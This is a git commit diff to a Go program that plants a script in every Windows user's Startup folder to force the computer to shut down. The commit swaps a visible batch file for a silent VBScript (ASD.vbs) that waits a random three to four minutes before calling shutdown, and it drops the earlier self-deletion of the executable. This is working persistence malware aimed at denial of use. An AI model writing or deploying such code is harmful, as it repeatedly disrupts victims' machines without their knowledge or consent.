d2cee4d15a38e3c5ec3b3b9c46638a63a4541ff6
FEI-Link <wang.2260587199@gmail.com>
2024-04-15 13:34:48 +0800

    完成

--- main.go
+++ main.go
@@ -14,7 +14,7 @@ func main() {
 	// 打开用户目录
 	dir, err := os.Open(usersDir)
 	if err != nil {
-		fmt.Println("打开失败:", err)
+		fmt.Println("没找到USER路径:", err)
 		return
 	}
 	defer dir.Close()
@@ -32,37 +32,21 @@ func main() {
 		if _, err := os.Stat(startupPath); err == nil {
 			fmt.Println("找到启动文件夹路径", user, ":", startupPath)
 
-			// 构建.bat文件路径
-			batFilePath := filepath.Join(startupPath, "shutdown.bat")
+			// 构建 .vbs 文件路径
+			vbsFilePath := filepath.Join(startupPath, "ASD.vbs")
 
-			// 写入.bat文件内容
-			batContent := `@echo off
-echo 关机计划已启动，将在三分钟后关机...
-timeout /t 180
-shutdown -s -t 0
-`
-			err := ioutil.WriteFile(batFilePath, []byte(batContent), 0644)
+			// 写入 .vbs 文件内容
+			vbsContent := `Set objShell = CreateObject("WScript.Shell")
+			Randomize
+			RandomTime = Int((240000 - 180000 + 1) * Rnd + 180000)
+			WScript.Sleep RandomTime
+			objShell.Run "shutdown.exe -s -t 0"`
+			err := ioutil.WriteFile(vbsFilePath, []byte(vbsContent), 0644)
 			if err != nil {
 				fmt.Println("写入失败:", err)
 				continue
 			}
-
-			fmt.Println("创建了shutdown.bat在", startupPath)
-
-			// 删除编译后的可执行文件
-			exePath, err := os.Executable()
-			if err != nil {
-				fmt.Println("获取可执行文件路径失败:", err)
-				return
-			}
-
-			err = os.Remove(exePath)
-			if err != nil {
-				fmt.Println("删除可执行文件失败:", err)
-				return
-			}
-
-			fmt.Println("已删除编译后的可执行文件:", exePath)
+			fmt.Println("创建了 ASD.vbs 在", startupPath)
 		}
 	}
 }
